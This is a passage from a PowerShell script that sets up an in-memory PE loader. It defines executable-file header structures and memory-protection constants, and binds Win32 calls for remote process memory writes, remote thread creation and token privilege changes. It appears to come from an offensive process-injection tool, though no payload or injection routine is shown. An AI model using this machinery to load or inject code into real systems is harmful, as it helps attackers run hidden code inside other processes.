		    $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		    #Struct IMAGE_NT_HEADERS64
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		    $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		    $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		    $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		    #Struct IMAGE_NT_HEADERS32
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		    $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		    $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		    $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		    #Struct IMAGE_DOS_HEADER
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		    $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		    $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		    $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		    $e_resField.SetCustomAttribute($AttribBuilder)

		    $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		    $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		    $e_res2Field.SetCustomAttribute($AttribBuilder)

		    $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		    $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		    #Struct IMAGE_SECTION_HEADER
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		    $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		    $nameField.SetCustomAttribute($AttribBuilder)

		    $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		    $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		    #Struct IMAGE_BASE_RELOCATION
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		    $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		    $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		    #Struct IMAGE_IMPORT_DESCRIPTOR
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		    $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		    $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		    #Struct IMAGE_EXPORT_DIRECTORY
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		    $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		    $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		    #Struct LUID
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		    $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		    $LUID = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		    #Struct LUID_AND_ATTRIBUTES
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		    $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		    $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		    #Struct TOKEN_PRIVILEGES
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		    $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		    return $Win32Types
	    }

	    Function Get-Win32Constants
	    {
		    $Win32Constants = New-Object System.Object
		
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		    return $Win32Constants
	    }

	    Function Get-Win32Functions
	    {
		    $Win32Functions = New-Object System.Object
		
		    $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		    $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		    $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		    $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		    $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		    $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		    $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		    $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		    $memsetAddr = Get-ProcAddress msvcrt.dll memset
		    $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		    $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		    $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		    $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		    $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		    $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		    $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		    $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		    $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		    $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		    $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		    $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		    $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		    $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		    $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		    $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		    $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		    $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		    $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		    $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		    $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		    $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		    $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		    $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		    $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		    $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		    $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
            $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		    $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
            $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		    $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
            $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
            $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		    $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
            $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
            $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		    $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
            $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
            $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
            $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
            $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
            $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
            $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
            $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
            $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
            $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
            $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		    $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
            $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		    $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
            $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
            $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		    return $Win32Functions
	    }
	    #####################################

			
	    #####################################
	    ###########    HELPERS   ############
	    #####################################

	    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	    Function Sub-SignedIntAsUnsigned
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Int64]
		    $Value1,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $Value2
		    )
		
		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		    [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		    if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		    {
			    $CarryOver = 0
			    for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			    {
				    $Val = $Value1Bytes[$i] - $CarryOver
				    #Sub bytes
				    if ($Val -lt $Value2Bytes[$i])
				    {
					    $Val += 256
					    $CarryOver = 1
				    }
				    else
				    {
					    $CarryOver = 0
				    }
				
				
				    [UInt16]$Sum = $Val - $Value2Bytes[$i]

				    $FinalBytes[$i] = $Sum -band 0x00FF
			    }
		    }
		    else
		    {
			    Throw "Cannot subtract bytearrays of different sizes"
		    }
		
		    return [BitConverter]::ToInt64($FinalBytes, 0)
	    }
	

	    Function Add-SignedIntAsUnsigned
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Int64]
		    $Value1,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $Value2
		    )
		
		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		    [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		    if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		    {
			    $CarryOver = 0
			    for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			    {
				    #Add bytes
				    [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				    $FinalBytes[$i] = $Sum -band 0x00FF
				
				    if (($Sum -band 0xFF00) -eq 0x100)
				    {
					    $CarryOver = 1
				    }
				    else
				    {
					    $CarryOver = 0
				    }
			    }
		    }
		    else
		    {
			    Throw "Cannot add bytearrays of different sizes"
		    }
		
		    return [BitConverter]::ToInt64($FinalBytes, 0)
	    }
	

	    Function Compare-Val1GreaterThanVal2AsUInt
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Int64]
		    $Value1,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $Value2
		    )
		
		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		    if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		    {
			    for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			    {
				    if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				    {
					    return $true
				    }
				    elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				    {
					    return $false
				    }
			    }
		    }
		    else
		    {
			    Throw "Cannot compare byte arrays of different size"
		    }
		
		    return $false
	    }
	

	    Function Convert-UIntToInt
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [UInt64]
		    $Value
		    )
		
		    [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		    return ([BitConverter]::ToInt64($ValueBytes, 0))
	    }
	
	
	    Function Test-MemoryRangeValid
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [String]
		    $DebugString,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [IntPtr]
		    $StartAddress,
		
		    [Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		    [IntPtr]
		    $EndAddress,
		
		    [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		    [IntPtr]
		    $Size
		    )
		
